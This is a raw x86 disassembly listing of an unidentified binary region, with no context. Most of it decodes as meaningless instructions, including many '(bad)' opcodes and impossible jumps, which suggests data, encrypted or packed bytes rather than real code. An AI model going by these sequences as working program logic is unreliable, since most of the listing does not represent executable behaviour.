  406ae4:	jnp    0x406a6e
  406ae6:	mov    ecx,0x85c68fbe
  406aeb:	cmp    esp,DWORD PTR [ecx+edi*2+0x75]
  406aef:	neg    BYTE PTR [eax+0x32dafb82]
  406af5:	in     eax,dx
  406af6:	rol    DWORD PTR [ebx],0x5d
  406af9:	and    eax,0x7f1774f6
  406afe:	sbb    bh,BYTE PTR ds:0x6b99cad7
  406b04:	push   ds
  406b05:	sub    DWORD PTR [eax],edi
  406b07:	(bad)  [eax+0x78]
  406b0a:	retf   0xc265
  406b0d:	out    dx,al
  406b0e:	sub    ch,BYTE PTR [ebp+0x34]
  406b11:	pusha  
  406b12:	cs cli 
  406b14:	mov    bh,0x95
  406b16:	push   es
  406b17:	push   fs
  406b19:	mov    edx,0xf9b3295a
  406b1e:	add    BYTE PTR [edx+0x28],dl
  406b21:	xchg   BYTE PTR [ebp+0x72],dl
  406b24:	or     dl,BYTE PTR [esi-0xb]
  406b27:	imul   dh
  406b29:	(bad)  
  406b2a:	sbb    DWORD PTR [edi+0x72e1084e],eax
  406b30:	pop    es
  406b31:	sbb    DWORD PTR [ecx-0x16c55f76],ecx
  406b37:	fnstsw WORD PTR [esi+0x730167c3]
  406b3d:	loopne 0x406ae0
  406b3f:	retf   0xdade
  406b42:	mov    bl,0xbd
  406b44:	pop    eax
  406b45:	imul   ebx,DWORD PTR [esi],0x26
  406b48:	or     ah,BYTE PTR [edx+0x79821ab1]
  406b4e:	push   ss
  406b4f:	sahf   
  406b50:	mov    esi,DWORD PTR [ebx-0x25]
  406b53:	mov    cl,0x52
  406b55:	push   eax
  406b56:	not    bh
  406b58:	push   ss
  406b59:	(bad)  
  406b5a:	in     eax,0x4
  406b5c:	retf   
  406b5d:	pop    ss
  406b5e:	inc    ecx
  406b5f:	push   esi
  406b60:	xor    DWORD PTR [edx-0x72d54d3b],esp
  406b66:	fld    QWORD PTR [edx+ebp*1]
  406b69:	das    
  406b6a:	pop    ebp
  406b6b:	loop   0x406ba0
  406b6d:	xlat   BYTE PTR ds:[ebx]
  406b6e:	sub    BYTE PTR [edi-0x6],bh
  406b71:	dec    ebp
  406b72:	loop   0x406b7e
  406b74:	mov    ah,0xd8
  406b76:	and    bl,BYTE PTR [ecx-0x37c9d31e]
  406b7c:	scas   eax,DWORD PTR es:[edi]
  406b7d:	jge    0x406b6d
  406b7f:	and    dl,BYTE PTR [ebp+0x32]
  406b82:	(bad)  
  406b85:	push   esi
  406b86:	stc    
  406b87:	cmp    ebx,DWORD PTR [esi-0x1692d41d]
  406b8d:	test   eax,0xfd292a3d
  406b92:	xor    DWORD PTR [ebp+0x4b61f0df],0x60
  406b99:	loop   0x406b9d
  406b9b:	out    dx,al
  406b9c:	xchg   ebx,eax
  406b9d:	jmp    0x406bac
  406b9f:	xchg   esp,eax
  406ba0:	repz sbb DWORD PTR [ebx],0xffffffc9
  406ba4:	scas   eax,DWORD PTR es:[edi]
  406ba5:	or     eax,0x89130902
  406baa:	jnp    0x406be8
  406bac:	scas   eax,DWORD PTR es:[edi]
  406bad:	inc    ecx
  406bae:	icebp  
  406baf:	jle    0x406bb2
  406bb1:	xchg   ecx,eax
  406bb2:	sub    ah,BYTE PTR [ecx]
  406bb4:	jae    0x406b9f
  406bb6:	jecxz  0x406c2f
  406bb8:	stos   BYTE PTR es:[edi],al
  406bb9:	mov    ecx,0xa6527a40
  406bbe:	push   eax
  406bbf:	xor    DWORD PTR [edx+esi*8-0xa747df9],ebx
  406bc6:	mov    ds:0x546a54a8,eax
  406bcb:	sub    al,0xc9
  406bcd:	jno    0x406bfc
  406bcf:	lock ret 0xce36
  406bd3:	inc    edi
  406bd4:	ins    DWORD PTR es:[edi],dx
  406bd5:	push   0x79df18ae
  406bda:	dec    eax
  406bdb:	add    BYTE PTR ds:0x598b4792,0xd6
  406be3:	pop    esp
  406be4:	mov    esi,0x3a9279f2
  406be9:	mov    esi,0x2380650
  406bee:	adc    al,dh
  406bf0:	(bad)  
  406bf1:	jge    0x406b91
  406bf3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406bf4:	aas    
  406bf5:	sti    
  406bf6:	mov    bl,0xbf
  406bf9:	lds    eax,FWORD PTR [esi]
  406bfb:	inc    eax
  406bfc:	or     eax,0xd88f8dbe
  406c01:	sbb    BYTE PTR [ebx+eax*2],0xd0
  406c05:	call   FWORD PTR [ebx+ebx*1-0x4f]
  406c09:	sbb    DWORD PTR [ebx],0x9571f3c2
  406c0f:	pushf  
  406c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c11:	adc    ch,ah
  406c13:	jnp    0x406bad
  406c15:	mov    esi,esi
  406c17:	inc    eax
  406c18:	dec    edi
  406c19:	jb     0x406c8b
  406c1b:	cs icebp 
  406c1d:	pop    edi
  406c1e:	xor    eax,0x36771ad5
  406c23:	push   ebp
  406c24:	xchg   ebp,eax
  406c25:	fcomp  DWORD PTR [ecx]
  406c27:	mov    ebp,0x94057b23
  406c2c:	adc    ebp,DWORD PTR [eax]
  406c2e:	cmp    al,0xb9
  406c30:	fistp  DWORD PTR [esi+edi*1+0x36a943d0]
  406c37:	std    
  406c38:	jl     0x406c63
  406c3a:	sbb    eax,DWORD PTR [ecx]
  406c3c:	(bad)  
  406c3d:	fmul   st(2),st
  406c3f:	aam    0xca
  406c41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c42:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406c43:	dec    ebx
  406c44:	call   0xbf2f2cf0
  406c49:	or     ebp,DWORD PTR [esi]
  406c4b:	outs   dx,BYTE PTR ds:[esi]
  406c4c:	fild   DWORD PTR [ebx+0x3c49b33d]
  406c52:	retf   0x74c
  406c55:	shl    dx,0x7f
  406c59:	sbb    edi,ebx
  406c5b:	into   
  406c5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406c5d:	xchg   esp,eax
  406c5e:	sub    al,bl
  406c60:	mov    dh,0x5f
  406c62:	js     0x406c68
  406c64:	push   0x1c
  406c66:	mov    ebp,0x6cf30fca
  406c6b:	inc    esi
  406c6c:	cmp    DWORD PTR ds:0x9aa21ae3,esp
  406c72:	repz pop eax
  406c74:	repnz and ecx,DWORD PTR [eax-0x582f258b]
  406c7b:	outs   dx,BYTE PTR ds:[esi]
  406c7c:	(bad)  
  406c7d:	xor    edi,DWORD PTR [eax+edi*8-0x1022881c]
  406c84:	add    DWORD PTR [ecx-0x688f1198],0xc27cb1ab
  406c8e:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  406c90:	ds loopne 0x406d11
  406c93:	jl     0x406d10
  406c95:	daa    
  406c96:	out    dx,al
  406c97:	push   ebp
  406c98:	mov    DWORD PTR [edx-0x55],edi
  406c9b:	mov    ecx,0x122714f8
  406ca0:	arpl   WORD PTR [edx-0x352ee21c],cx
  406ca6:	sub    al,0x8d
  406ca8:	out    0xdd,eax
  406caa:	fdiv   QWORD PTR [bp+di-0x78]
  406cae:	dec    ebx
  406caf:	arpl   WORD PTR [ebp-0x24afad49],bx
  406cb5:	pop    edi
  406cb6:	cs out dx,eax
  406cb8:	retf   
  406cb9:	push   cs
  406cba:	pop    ebp
  406cbb:	add    ch,cl
  406cbd:	int3   
  406cbe:	gs js  0x406d0f
  406cc1:	push   0xffffffc3
  406cc3:	clc    
  406cc4:	mov    ecx,ecx
  406cc6:	mov    WORD PTR [edx-0xbd84c5],?
  406ccc:	jne    0x406cc2
  406cce:	push   DWORD PTR [ebp-0x14]
  406cd1:	call   0x405aeb
  406cd6:	test   eax,eax
  406cd8:	je     0x40739d
  406cde:	lea    eax,[ebp-0x78]
  406ce1:	jmp    0x40702e
  406ce6:	enter  0xde98,0x5a
  406cea:	outs   dx,BYTE PTR ds:[esi]
  406ceb:	bound  edx,QWORD PTR [edx+esi*4-0x2d]
  406cef:	adc    eax,0xd490d985
  406cf4:	xchg   DWORD PTR [ecx],esi
  406cf6:	retf   
  406cf7:	(bad)  
  406cf8:	jo     0x406d6a
  406cfa:	and    BYTE PTR [ebp+0x70],bh
  406cfd:	jo     0x406d34
  406cff:	mov    BYTE PTR [esi+0x54d872ad],0x26
  406d06:	lods   al,BYTE PTR ds:[esi]
  406d07:	mov    WORD PTR [edx+eiz*8],es
  406d0a:	jge    0x406cf3
  406d0c:	mov    ch,0x2e
  406d0e:	and    DWORD PTR [edi],esi
  406d10:	cmp    eax,DWORD PTR ds:0x5ff4d49b
  406d16:	loopne 0x406cff
  406d18:	mov    bh,0xa8
  406d1a:	imul   DWORD PTR [ebx+0x9bd8ea8]
  406d20:	clc    
  406d21:	xchg   DWORD PTR [ecx+0xe60e491],edx
  406d27:	je     0x406da3
  406d29:	fs ins DWORD PTR es:[edi],dx
  406d2b:	int3   
  406d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d2d:	cwde   
  406d2e:	imul   edi,DWORD PTR [eax+0x30f81f3],0xba52fb
  406d38:	out    dx,al
  406d39:	pusha  
  406d3a:	xor    cl,BYTE PTR [edx+eiz*4-0x28]
  406d3e:	push   eax
  406d3f:	test   al,0xf0
  406d41:	or     al,0x92
  406d43:	hlt    
  406d44:	retf   0x2f0b
  406d47:	ffreep st(7)
  406d49:	adc    eax,0x754dc79b
  406d4e:	add    eax,0x6c50a57e
  406d53:	adc    bl,BYTE PTR [ebx+0x2b0e53db]
  406d59:	sbb    al,0x8a
  406d5b:	mov    ds:0xb51a3a47,eax
  406d60:	addr16 push ss
  406d62:	daa    
  406d63:	mov    ebp,0xb7c34763
  406d68:	cmp    eax,0x46c12344
  406d6d:	add    DWORD PTR [ecx+edx*2-0x1a],0x9
  406d72:	pop    esp
  406d73:	mov    bl,0x51
  406d75:	shl    BYTE PTR [eax+0x14792baa],cl
  406d7b:	fisttp DWORD PTR [edx]
  406d7d:	lahf   
  406d7e:	sbb    al,0xe3
  406d80:	pop    edx
  406d81:	pusha  
  406d82:	pop    edx
  406d83:	ffreep st(2)
  406d85:	rcr    esi,cl
  406d87:	loopne 0x406d9d
  406d89:	adc    al,0x82
  406d8b:	inc    ecx
  406d8c:	pop    edi
  406d8d:	jae    0x406ded
  406d8f:	test   eax,0x5277badf
  406d94:	sbb    BYTE PTR [edx],0x98
  406d97:	std    
  406d98:	ucomiss xmm7,DWORD PTR [edx-0x150162c4]
  406d9f:	std    
  406da0:	mov    ch,0x8e
  406da2:	(bad)  
  406da3:	stc    
  406da4:	mov    ah,0x6d
  406da6:	adc    DWORD PTR [edx+0x30],edx
  406da9:	pop    es
  406daa:	mov    esp,DWORD PTR [edi+0x6c]
  406dad:	or     al,0xb3
  406daf:	cmp    DWORD PTR [edx-0x5b],ebp
  406db2:	pop    edi
  406db3:	jg     0x406d54
  406db5:	mov    ds:0x11f75c7b,eax
  406dba:	(bad)  
  406dbb:	adc    BYTE PTR [ebx+0x21],bh
  406dbe:	outs   dx,DWORD PTR ds:[esi]
  406dbf:	xor    BYTE PTR [ecx],al
  406dc1:	xchg   DWORD PTR [ecx+ebx*4-0x480512f8],ecx
  406dc8:	mov    bl,0x97
  406dca:	jl     0x406e0a
  406dcc:	adc    bl,BYTE PTR ds:0xa76501f3
  406dd2:	xchg   esp,eax
  406dd3:	mov    DWORD PTR [ebx+0x45],ebp
  406dd6:	sbb    ebp,0x533e4063
  406ddc:	jo     0x406e41
  406dde:	aad    0x62
  406de0:	retf   0x8519
  406de3:	cmp    DWORD PTR fs:[edx-0x33],esi
  406de7:	and    eax,0x24d0787
  406dec:	sti    
  406ded:	popf   
  406dee:	pop    eax
  406def:	aas    
  406df0:	and    ecx,DWORD PTR [ebp-0x397f5596]
  406df6:	mov    eax,0x3e5eca37
  406dfb:	sbb    dl,BYTE PTR [ebx+0x49]
  406dfe:	pop    esp
  406dff:	leave  
  406e00:	ja     0x406daa
  406e02:	sbb    eax,0x24b535f2
  406e07:	mov    esp,0x666bfaa2
  406e0c:	push   ebx
  406e0d:	imul   dx,sp,0x6
  406e11:	test   BYTE PTR [edi-0x4a],ah
  406e14:	cs test al,0x3f
  406e17:	shl    BYTE PTR [ebp+0x26],1
  406e1a:	jno    0x406e44
  406e1c:	cld    
  406e1d:	dec    eax
  406e1e:	mov    cs,esp
  406e20:	je     0x406def
  406e22:	jo     0x406dbd
  406e24:	daa    
  406e25:	out    dx,eax
  406e26:	ja     0x406e06
  406e28:	sub    al,0x6a
  406e2a:	ficom  DWORD PTR [edi-0x53]
  406e2d:	std    
  406e2e:	dec    edi
  406e2f:	jp     0x406e49
  406e31:	pusha  
  406e32:	es stc 
  406e34:	int3   
  406e35:	pop    ss
  406e36:	arpl   WORD PTR [esi],sp
  406e38:	imul   esp,DWORD PTR [ebx+0x48],0xffffff94
  406e3c:	imul   ebp,DWORD PTR [eax],0x52
  406e3f:	ds add dh,ch
  406e42:	mov    BYTE PTR [ebp+0x58],bl
  406e45:	pop    esi
  406e46:	mov    DWORD PTR [edx-0xe9b513f],ecx
  406e4c:	cdq    
  406e4d:	bound  edx,QWORD PTR [ecx]
  406e4f:	ins    DWORD PTR es:[edi],dx
  406e50:	mov    al,ds:0x25d0e6b3
  406e55:	mov    BYTE PTR [ebp-0x63],0x1e
  406e59:	rcr    BYTE PTR [edi+ecx*8-0x6e1f11ec],1
  406e60:	sbb    al,0xa2
  406e62:	dec    esp
  406e63:	test   BYTE PTR [eax-0x1f],dl
  406e66:	popf   
  406e67:	xlat   BYTE PTR ds:[ebx]
  406e68:	outs   dx,BYTE PTR ds:[esi]
  406e69:	dec    ecx
  406e6a:	cmc    
  406e6b:	dec    eax
  406e6c:	push   esi
  406e6d:	inc    eax
  406e6e:	mov    bh,0xc4
  406e70:	xor    ch,dl
  406e72:	popa   
  406e73:	push   cs
  406e74:	push   0x46
  406e76:	jmp    0x5292de6a
  406e7b:	jb     0x406dfe
  406e7d:	xor    bl,bl
  406e7f:	jb     0x406e36
  406e81:	push   edi
  406e82:	in     al,0xc5
  406e84:	xor    DWORD PTR [ecx-0x3],edx
  406e87:	call   0x6e672dab
  406e8c:	int    0x3e
  406e8e:	ins    BYTE PTR es:[edi],dx
  406e8f:	add    dl,al
  406e91:	or     cl,BYTE PTR [ebp+0x4838d389]
  406e97:	retf   0x62e2
  406e9a:	lock dec esi
  406e9c:	inc    esp
  406e9d:	or     DWORD PTR [ecx-0x1c7bf3c0],edi
  406ea3:	or     cl,BYTE PTR [ebx]
  406ea5:	popa   
  406ea6:	cmp    DWORD PTR [ebp+0x623cc26f],0xffffff89
  406ead:	int3   
  406eae:	xchg   ecx,eax
  406eaf:	push   ebx
  406eb0:	add    bh,bl
  406eb2:	dec    ebp
  406eb3:	mov    DWORD PTR [edi-0x43d6ae7d],ebp
  406eb9:	popf   
  406eba:	mov    esi,0x9b73ba98
  406ebf:	outs   dx,BYTE PTR ds:[esi]
  406ec0:	scas   eax,DWORD PTR es:[edi]
  406ec1:	fdivrp st(0),st
  406ec3:	push   0xd94863
  406ec8:	sar    BYTE PTR [esi-0x24],0xe1
  406ecc:	lods   eax,DWORD PTR ds:[esi]
  406ece:	(bad)  
  406ecf:	lahf   
  406ed0:	dec    edx
  406ed1:	cwde   
  406ed2:	popa   
  406ed3:	retf   
  406ed4:	dec    ebp
  406ed5:	jbe    0x406f41
  406ed7:	arpl   WORD PTR [edx-0x4c762312],ax
  406edd:	xchg   ebx,eax
  406ede:	fsubr  QWORD PTR [edx+0x2a593626]
  406ee4:	dec    ecx
  406ee5:	mov    ebp,0x76d32018
  406eea:	sub    esi,DWORD PTR ds:0x72ee2852
  406ef0:	sar    BYTE PTR [edi],cl
  406ef2:	retf   0xe586
  406ef5:	sbb    bl,al
  406ef7:	call   0x93b77f49
  406efc:	ins    DWORD PTR es:[edi],dx
  406efd:	sbb    ecx,ebx
  406eff:	call   0xed575dd8
  406f04:	add    ah,ch
  406f06:	loope  0x406ed3
  406f08:	lods   eax,DWORD PTR ds:[esi]
  406f09:	sub    eax,0x9a139db1
  406f0e:	test   BYTE PTR ds:0x91a65eb,bh
  406f14:	popf   
  406f15:	mov    ebp,DWORD PTR ds:0x185ce74f
  406f1b:	mov    cl,0x67
  406f1d:	rol    DWORD PTR [edi+0x147d4b66],cl
  406f23:	cmc    
  406f24:	or     eax,0xfe6cf0ca
  406f29:	mov    BYTE PTR [eax-0xa6c3067],bh
  406f2f:	xchg   DWORD PTR [edx+0x68],esi
  406f32:	jno    0x406f61
  406f34:	mov    gs,esp
  406f36:	je     0x406f55
  406f38:	in     al,dx
  406f39:	cmp    BYTE PTR [edi+0x7c7129a9],bh
  406f3f:	xlat   BYTE PTR ds:[ebx]
  406f40:	mov    dh,0x4d
  406f42:	jle    0x406ec6
  406f44:	jne    0x406fa7
  406f46:	div    al
  406f48:	sti    
  406f49:	pop    ss
  406f4a:	xlat   BYTE PTR ds:[ebx]
  406f4b:	inc    eax
  406f4c:	imul   eax,DWORD PTR [eax-0x4c3fd8a3],0xffffff90
  406f53:	cmp    eax,0xebe25431
  406f58:	inc    esp
  406f59:	sbb    BYTE PTR [eax+edi*2],0x44
  406f5d:	or     eax,0x848870f4
  406f62:	xchg   ebp,eax
  406f63:	adc    BYTE PTR [ebp+0x3d],ah
  406f66:	mov    fs,WORD PTR [ecx]
  406f68:	jp     0x406f95
  406f6a:	xchg   ecx,eax
  406f6b:	adc    cl,BYTE PTR [ecx-0xc3133d3]
  406f71:	dec    ecx
  406f72:	icebp  
  406f73:	imul   edx,DWORD PTR [eax+edx*4-0x4b2b5ec0],0x3
  406f7b:	cmp    eax,0x3dba790
  406f80:	mov    esi,DWORD PTR [ebx+edi*1]
  406f83:	push   esp
  406f84:	mov    bh,0xfd
  406f86:	nop
  406f87:	adc    edi,esi
  406f89:	mov    ah,0xa5
  406f8b:	inc    edi
  406f8c:	enter  0x61a2,0xf9
  406f90:	scas   al,BYTE PTR es:[edi]
  406f91:	test   dl,cl
  406f93:	test   DWORD PTR [ebp+edx*8-0xa],ebx
  406f97:	das    
  406f98:	push   edi
  406f99:	mov    esi,0x95001dbe
  406f9e:	mov    ds:0xd7ca9a26,al
  406fa3:	les    ebp,FWORD PTR [ebp+0x42]
  406fa6:	xchg   ecx,eax
  406fa7:	sub    BYTE PTR [eax+0x5f],ch
  406faa:	push   edi
  406fab:	push   ebx
  406fac:	sbb    eax,0x6994f88
  406fb1:	add    esi,DWORD PTR [esi-0x4d]
  406fb4:	in     al,0x6e
  406fb6:	mov    ch,0x56
  406fb8:	jae    0x406faf
  406fba:	mov    edx,DWORD PTR [edi]
  406fbc:	pop    ecx
  406fbd:	jmp    DWORD PTR [esi-0x44b1baad]
  406fc3:	lea    esp,gs:[edx+edi*8+0x753a68e0]
  406fcb:	int    0xae
  406fcd:	push   esi
  406fce:	fcomip st,st(0)
  406fd0:	ret    0xf60d
  406fd3:	fs mov cl,0x49
  406fd6:	add    ch,BYTE PTR [ebx+0x72]
  406fd9:	xchg   ecx,eax
  406fda:	dec    eax
  406fdb:	mov    esi,0x293246e2
  406fe0:	push   ds
  406fe1:	and    BYTE PTR [edx],ah
  406fe3:	shl    edi,0x3f
  406fe6:	hlt    
  406fe7:	mov    dh,0x14
  406fe9:	daa    
  406fea:	jns    0x406f93
  406fec:	loopne 0x407015
  406fee:	mov    ebp,0x621d6e7d
  406ff3:	(bad)  
  406ff4:	es int3 
  406ff6:	sbb    ebp,ebp
  406ff8:	pop    ebp
  406ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406ffa:	inc    esi
  406ffb:	and    DWORD PTR [ebx],0x6332bb62
  407001:	fcom   DWORD PTR [eax+ebx*4]
  407004:	inc    ecx
  407005:	mov    cl,0xdc
  407007:	dec    esp
  407008:	mov    DWORD PTR [ecx-0x3a407779],eax
  40700e:	pop    edx
  40700f:	fnstcw WORD PTR [edi]
  407011:	xchg   ebp,eax
  407012:	jge    0x406fc5
  407014:	lahf   
  407015:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407016:	and    BYTE PTR [ecx+0x64],0xd4
  40701a:	and    esi,DWORD PTR [ebp-0x69a837a6]
  407020:	fst    st(4)
  407022:	mov    fs,ecx
  407024:	xlat   BYTE PTR ds:[ebx]
  407025:	pop    ebp
  407026:	icebp  
  407027:	(bad)  
  407028:	jne    0x407011
  40702a:	cmp    eax,0x501473f2
  40702f:	mov    eax,DWORD PTR [ebp-0x14]
  407032:	xor    eax,esi
  407034:	add    eax,edi
  407036:	push   eax
  407037:	mov    eax,DWORD PTR [ebp-0x10]
  40703a:	add    eax,0xee
  40703f:	push   eax
  407040:	mov    eax,DWORD PTR [ebp-0x10]
  407043:	jmp    0x407390
  407048:	inc    esp
  407049:	jmp    edx
  40704b:	cwde   
  40704c:	loope  0x4070af
  40704e:	inc    edx
  40704f:	pop    ebx
  407050:	(bad)  
  407051:	mov    dh,0x44
  407053:	mov    esi,0x4a4a1ff7
  407058:	sti    
  407059:	les    esi,FWORD PTR [eax+0x70]
  40705c:	and    BYTE PTR [ebp+0x70],bh
  40705f:	jo     0x407042
  407061:	icebp  
  407062:	jno    0x407043
  407064:	push   esi
  407065:	ins    BYTE PTR es:[edi],dx
  407066:	jl     0x4070b2
  407068:	cmp    esi,esi
  40706a:	div    BYTE PTR [ecx]
  40706c:	inc    edx
  40706d:	das    
  40706e:	xor    al,0xed
  407070:	repz jg 0x4070ec
  407073:	cld    
  407074:	add    al,0x3a
  407076:	sub    DWORD PTR [edi-0x6492d9be],esi
  40707c:	(bad)  
  40707d:	mov    ebx,0x346512b4
  407082:	or     bl,BYTE PTR [ebp-0x63]
  407085:	jecxz  0x407090
  407087:	shr    ah,cl
  407089:	mov    al,0x4e
  40708b:	mov    ebp,0x3b66ccb0
  407090:	hlt    
  407091:	lahf   
  407092:	push   ecx
  407093:	ja     0x40701b
  407095:	or     DWORD PTR [edi-0x68aa1714],ebp
  40709b:	cli    
  40709c:	pop    ss
  40709d:	inc    eax
  40709e:	(bad)  
  40709f:	pushf  
  4070a0:	int3   
  4070a1:	test   DWORD PTR [esi+0x4f],0x38582845
  4070a8:	imul   ebp,DWORD PTR [eax],0x5e43eb53
  4070ae:	cli    
  4070af:	in     eax,dx
  4070b0:	mov    ds:0xed79a686,al
  4070b5:	push   ebx
  4070b6:	xor    DWORD PTR [esi+0x7b],0xd35dd6ef
  4070bd:	and    BYTE PTR [edx+0x470373b4],cl
  4070c3:	jg     0x4070ce
  4070c5:	add    BYTE PTR [ecx+0x4],dh
  4070c8:	add    BYTE PTR [eax+0x26],bl
  4070cb:	fstp   DWORD PTR [ebx-0x52c8366]
  4070d1:	scas   eax,DWORD PTR es:[edi]
  4070d2:	xchg   ebp,eax
  4070d3:	xchg   esp,eax
  4070d4:	mov    ecx,0x810bbc23
  4070d9:	es jge 0x407148
  4070dc:	test   eax,0x825d283f
  4070e1:	frstor [edi]
  4070e3:	arpl   WORD PTR [esi+0x2171c49a],di
  4070e9:	pavgb  mm0,mm5
  4070ec:	popa   
  4070ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4070ee:	dec    eax
  4070ef:	shl    BYTE PTR [ebp+0x6],cl
  4070f2:	sbb    BYTE PTR [edi],al
  4070f4:	and    al,0x52
  4070f6:	lea    edx,[edi-0x50bf0fcc]
  4070fc:	shl    DWORD PTR [ebp-0x2a],1
  4070ff:	jno    0x407167
  407101:	pop    es
  407102:	sub    eax,0x11353af
  407107:	popa   
  407108:	mov    al,0xb
  40710a:	or     dl,ch
  40710c:	add    edi,DWORD PTR ds:0x45e3748
  407112:	adc    BYTE PTR [esi+0x2c],bl
  407115:	imul   ebx,DWORD PTR [eax+0xd],0xb9203246
  40711c:	mov    eax,0x95c83632
  407121:	mov    ds:0x1f906025,al
  407126:	mov    bh,0xa5
  407128:	mov    dh,0x6a
  40712a:	cmp    bh,bh
  40712c:	xor    BYTE PTR [ebp+0x5c1d2b18],0x2d
  407133:	arpl   WORD PTR [eax-0x75],sp
  407136:	sbb    BYTE PTR [ebx+0x5790685a],bh
  40713c:	in     eax,0xfb
  40713e:	fs mov ah,0x3f
  407141:	leave  
  407142:	icebp  
  407143:	mov    eax,ds:0xd889b8cc
  407148:	push   ds
  407149:	lock ja 0x40719b
  40714c:	loopne 0x407127
  40714e:	into   
  40714f:	repnz in al,dx
  407151:	dec    esi
  407152:	lahf   
  407153:	sub    esi,eax
  407155:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407156:	ja     0x407179
  407158:	retf   0x6058
  40715b:	or     eax,DWORD PTR [esi]
  40715d:	pop    esp
  40715e:	js     0x4071ab
  407160:	mov    ebp,0x238a5e7c
  407165:	cmp    edx,DWORD PTR [ecx-0x7cfebc51]
  40716b:	in     eax,0xff
  40716d:	mov    ecx,0x7bcb826a
  407172:	push   edi
  407173:	(bad)  
  407174:	jnp    0x4071ed
  407176:	cmp    eax,0x7c27cf0c
  40717b:	push   0xffffffa0
  40717d:	push   ss
  40717e:	adc    ch,BYTE PTR [eax+0x5a]
  407181:	sub    al,0xbb
  407183:	imul   ebp,DWORD PTR [esi],0x1afa4c10
  407189:	adc    al,0x45
  40718b:	jge    0x40717b
  40718d:	clc    
  40718e:	cmp    DWORD PTR [ecx],ebx
  407190:	xchg   edx,eax
  407191:	sbb    esi,DWORD PTR [edi]
  407193:	sub    ebp,DWORD PTR [ebp-0x70]
  407196:	or     DWORD PTR [esi-0x6f],esi
  407199:	cmp    BYTE PTR [esi-0x2d],0x79
  40719d:	ins    BYTE PTR es:[edi],dx
  40719e:	repnz aaa 
  4071a0:	rcl    edx,1
  4071a2:	cmp    dh,BYTE PTR [esi]
  4071a4:	add    BYTE PTR [esp+eax*4-0x72df29a7],0x8d
  4071ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4071ad:	mov    ecx,eax
  4071af:	xor    dl,BYTE PTR [eax+0x271540d2]
  4071b5:	leave  
  4071b6:	xchg   edx,eax
  4071b7:	mov    dl,0xf4
  4071b9:	imul   edx,DWORD PTR [ebp-0x24],0xffffff82
  4071bd:	add    BYTE PTR [edx-0x79],ch
  4071c0:	cmp    al,0x9d
  4071c2:	mov    esp,0xdacacf90
  4071c7:	out    dx,al
  4071c8:	sub    ecx,DWORD PTR [edi+ebp*4]
  4071cb:	pop    ds
  4071cc:	inc    ebx
  4071cd:	mov    eax,edi
  4071cf:	push   ss
  4071d0:	cld    
  4071d1:	icebp  
  4071d2:	xchg   ebx,eax
  4071d3:	out    0xb,al
  4071d5:	jmp    0xba61:0xec0b7631
  4071dc:	out    dx,al
  4071dd:	stos   BYTE PTR es:[edi],al
  4071de:	in     al,0x64
  4071e0:	dec    esi
  4071e1:	lock (bad) 
  4071e3:	sbb    DWORD PTR [ebx-0x348086ef],edi
  4071e9:	mov    DWORD PTR [eax-0x58],esi
  4071ec:	inc    esi
  4071ed:	loopne 0x407209
  4071ef:	mov    dh,0x6b
  4071f1:	xor    BYTE PTR [eax-0x1b],al
  4071f4:	sbb    DWORD PTR [eax+ebp*2+0x32],0x3b6b70ed
  4071fc:	dec    esp
  4071fd:	(bad)  
  4071fe:	xchg   ecx,eax
  4071ff:	jae    0x40718a
  407201:	or     al,0x37
  407203:	xor    DWORD PTR [esi+eiz*8+0x6f16de8e],edi
  40720a:	lds    eax,FWORD PTR [eax-0x23f1b82e]
  407210:	daa    
  407211:	push   ss
  407212:	mov    al,0x72
  407214:	push   cs
  407215:	lods   al,BYTE PTR ss:[esi]
  407217:	jecxz  0x4071ad
  407219:	and    al,0xcc
  40721b:	and    eax,0x53742f69
  407220:	adc    eax,esi
  407222:	es mov al,0xc1
  407225:	data16 lahf 
  407227:	push   esp
  407228:	add    BYTE PTR [ecx-0x35dd91ba],ch
  40722e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40722f:	adc    eax,DWORD PTR [ebp+eiz*4+0x6b94d461]
  407236:	jae    0x4072a7
  407238:	scas   eax,DWORD PTR es:[edi]
  407239:	xor    DWORD PTR [edi+0x78],ecx
  40723c:	sahf   
  40723d:	inc    esp
  40723e:	hlt    
  40723f:	or     eax,0x89a8eb2e
  407244:	mov    esp,0x8aa49004
  407249:	outs   dx,BYTE PTR ds:[esi]
  40724a:	out    dx,eax
  40724b:	jl     0x407267
  40724d:	mov    cl,0xb8
  40724f:	bnd jle 0x407269
  407252:	mov    al,ds:0x90c7090
  407257:	std    
  407258:	xchg   esi,eax
  407259:	into   
  40725a:	aad    0x8e
  40725c:	je     0x4072d5
  40725e:	and    eax,ebx
  407260:	sub    al,0x49
  407262:	ss jge 0x4072c1
  407265:	xchg   edi,eax
  407266:	hlt    
  407267:	xor    eax,DWORD PTR ds:0xbcc7e28d
  40726d:	dec    edx
  40726e:	pop    es
  40726f:	cs push eax
  407271:	popa   
  407272:	popa   
  407273:	adc    al,0x6f
  407275:	jl     0x4072c9
  407277:	js     0x4071ff
  407279:	and    al,0xf
  40727b:	xor    eax,0x5c3a9e57
  407280:	retf   0x1148
  407283:	sbb    eax,0x8a52f7e3
  407288:	mov    ds:0xf695054b,al
  40728d:	sbb    BYTE PTR [edx-0x7f53ffc9],ah
  407293:	div    DWORD PTR [edi+0x723c1281]
  407299:	push   ecx
  40729a:	xor    DWORD PTR [eax],eax
  40729c:	or     dl,BYTE PTR [edx+0x3]
  40729f:	mov    ebx,0xa674f1f8
  4072a4:	lea    edi,[ecx-0x147d1438]
  4072aa:	and    dh,BYTE PTR [edi]
  4072ac:	fwait
  4072ad:	jmp    0xd0aee3cc
  4072b2:	xchg   ebp,eax
  4072b3:	int3   
  4072b4:	jmp    0x4072b5
  4072b6:	dec    edi
  4072b7:	or     al,0x84
  4072b9:	inc    eax
  4072ba:	add    eax,0x94675744
  4072bf:	sub    eax,0xc9c7adc8
